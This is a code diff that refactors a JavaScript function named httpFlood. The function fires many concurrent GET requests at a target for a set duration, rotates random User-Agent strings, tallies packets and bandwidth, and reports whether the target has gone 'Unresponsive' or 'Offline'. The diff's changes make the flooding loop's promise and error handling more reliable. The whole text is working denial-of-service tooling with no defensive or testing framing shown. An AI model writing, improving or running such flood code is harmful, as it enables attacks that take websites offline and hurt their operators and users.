@@ -32,8 +32,7 @@ async function httpFlood(target, duration, intensity) {
       for (let i = 0; i < intensity; i++) {
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 
-        const promise = new Promise(resolve => {
-          fetch(target, {
+        const promise = fetch(target, {
             method: 'GET',
             headers: {
               'User-Agent': userAgent,
@@ -44,19 +43,17 @@ async function httpFlood(target, duration, intensity) {
             mode: 'no-cors'
           })
           .then(response => {
-            if (response.ok) {
-              packetsSent++;
-              mbps += response.headers.get('content-length') / 1000000;
-            } else {
+            packetsSent++;
+            if (response.ok && response.headers.get('content-length')) {
+                mbps += parseFloat(response.headers.get('content-length')) / 1000000;
+            } else if (!response.ok) {
               targetStatus = 'Unresponsive';
             }
-            resolve();
           })
           .catch(error => {
             targetStatus = 'Offline';
-            resolve();
+            console.warn("Request failed:", error); // Log the error for debugging.
           });
-        });
         promises.push(promise);
       }
       await Promise.all(promises);
